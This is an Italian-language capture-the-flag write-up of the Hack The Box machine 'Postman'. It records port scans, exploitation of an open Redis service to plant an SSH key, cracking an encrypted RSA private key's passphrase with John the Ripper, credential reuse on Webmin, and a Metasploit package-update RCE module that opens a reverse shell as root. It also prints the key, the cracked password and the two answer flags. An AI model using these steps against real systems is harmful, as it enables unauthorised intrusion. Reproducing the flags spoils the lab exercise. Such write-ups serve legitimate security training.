@@ -1,0 +1,161 @@
+1) scansione delle porte con masscan:
+	comando: masscan -p1-65535 10.10.10.160 --rate 1000 --open --banners -e tun0
+	risultato:
+			Scanning 1 hosts [65535 ports/host]
+			Discovered open port 80/tcp on 10.10.10.160                                    
+			Discovered open port 6379/tcp on 10.10.10.160 
+
+2) scansione con nmap mi da come porta aperta anche 10000 ma non rileva 6379, quindi rifaccio scansione
+direttamente sulle porte
+	comando: nmap -p22,80,10000,6379 -Pn -sC -sV -oA nmap/postman 10.10.10.160
+	risultato:
+			PORT      STATE SERVICE VERSION
+			22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+			| ssh-hostkey: 
+			|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+			|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+			|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+			80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+			|_http-title: The Cyber Geek's Personal Website
+			6379/tcp  open  redis   Redis key-value store 4.0.9
+			10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+			|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+			|_http-trane-info: Problem with XML parsing of /evox/about
+			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+3)per prima cosa controllo il server sulla porta 80, la home page è il sito personale del creatore della box.
+faccio una scansione con dirb
+---- Scanning URL: http://10.10.10.160/ ----
+==> DIRECTORY: http://10.10.10.160/css/                                        
+==> DIRECTORY: http://10.10.10.160/fonts/                                      
+==> DIRECTORY: http://10.10.10.160/images/                                     
++ http://10.10.10.160/index.html (CODE:200|SIZE:3844)                          
+==> DIRECTORY: http://10.10.10.160/js/                                         
++ http://10.10.10.160/server-status (CODE:403|SIZE:300)                        
+==> DIRECTORY: http://10.10.10.160/upload/  
+
+nulla di utile. anche se è strano avere la cartella upload se il sito nopn permette di fare upload
+
+
+4) si può provare ad attaccare redis, è già possibile accedere ed eseguire comandi tramite redis-cli -h 10.10.10.160
+	metodo 1) semplice attacco tramite metasploitable (exploit fatto apposta per Authenticated Remote Execution) -> NON FUNZIONA
+	metodo 2) https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+		  in effetti però non funziona così com'è in quanto la cartella .ssh ( e di conseguenza il file authorized_keys)
+	 	  non è nella cartella standard dove dovrebbe essere quindi quando si prova a connettersi con ssh viene comunque 
+			script: redis_hack.py (https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py)
+			chiamare con: python redis_hack.py 10.10.10.160 redis     (<ip> e <username>)
+			errore: può esserci l'errore che dice che lo slave è di sola lettura, se è cosi collegarsi a redis-cli e usare:
+				config set slave-read-only no
+				
+
+5) usando il metodo 2 si riesce ad ottenere la shell con user = redis, cercando si trova il file user.txt sotto /home/Matt/
+   ma non è accessibile perchè mancano i permessi. Tornando alla home di redis trviamo un file id_rsa.bak, ovvero quello che sembra essere
+   un backup (o qualcosa del genere) di un chiave rsa:
+ 
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+
+
+  ci sono due campi:Proc-Type -> tipo di processamento subito: in questo caso è stato criptato https://www.freesoft.org/CIE/RFC/1421/23.htm
+		    DEK-Info  -> identifica algoritmo usato per criptare e altre info come l'IV https://www.freesoft.org/CIE/RFC/1421/29.htm 
+
+6) visto che si tratta di un file criptato quindi c'è bisogno di decriptarlo, per farlo si può usare JohnTheRipper
+jtr però ha bisogno del file in formato adatto, ovvero serve l'hash del file e su quello poi si può operare. 
+per ottenerlo si può usare ssh2john 
+	comando: python /usr/share/john/ssh2john.py id_rsa.bak > id_rsa_2john
+
+ora uso il file ottenuto con john e la wordlist rockyou
+	comando: john --wordlist=/root/Desktop/lists/rockyou.txt id_rsa_2john
+
+ottengo:
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+computer2008     (id_rsa.bak)
+1g 0:00:00:09 47.08a257741c5bed8be7778c6ed95686ddce% (ETA: 14:08:28) 0.1101g/s 754639p/s 754639c/s 754639C/s jsr2004..jsqm89
+1g 0:00:00:12 63.82% (ETA: 14:08:27) 0.08278g/s 759679p/s 759679c/s 759679C/s chase015..chase madison
+1g 0:00:00:18 96.15% (ETA: 14:08:27) 0.05530g/s 764352p/s 764352c/s 764352C/s 082515890..0825135092
+Warning: Only 1 candidate left, minimum 4 needed for performance.
+1g 0:00:00:18 DONE (2019-11-08 14:08) 0.05302g/s 760429p/s 760429c/s 760429C/s *7¡Vamos!
+Session completed
+
+
+dunque la passphrase è computer2008, a questo punto posso connettermi con ssh:
+	comando: ssh -i id_rsa.bak Matt@10.10.10.160
+(poi ssh chiede passphrase trovata con john)
+putroppo non permette l'accesso (connection closed)
+
+7)provo a connettermi a webmin attraverso la login page perchè so che l'user potrebbe essere Matt e la pass computer2008
+infatti andando a https://10.10.10.160:10000 è possibile fare login con Matt:computer2008
+appena entrato ci sono dei package update da fare e usando searchsploit si può vedere che è disponibile un exploit di metasploit
+proprio per la versione 1.910 e che prevede che ci siano dei package update
+
+8)apro metasploit 
+   comandi:
+		search webmin
+		use 2 //(exploit/linux/http/webmin_packageup_rce)
+		show options
+		set PASSWORD computer2008
+		set RHOSTS 10.10.10.160
+		set USERNAME Matt
+		set LHOST 10.10.15.224 //(local ip)
+		set SSL true
+		exploit
+a questo punto con il comando id si ottiene:
+uid=0(root) gid=0(root) groups=0(root)
+
+quindi si devono solo trovare i due flag:
+
+(non riesco a cambiare posizione quindi faccio locate e poi cat specificando il percorso)
+
+
+user: 517ad0ec2458ca97af8d93aac08a2f3c
+
+root: a257741c5bed8be7778c6ed95686ddce
+
+
+
+
+
+
+
+
+
+
+
+
+
+
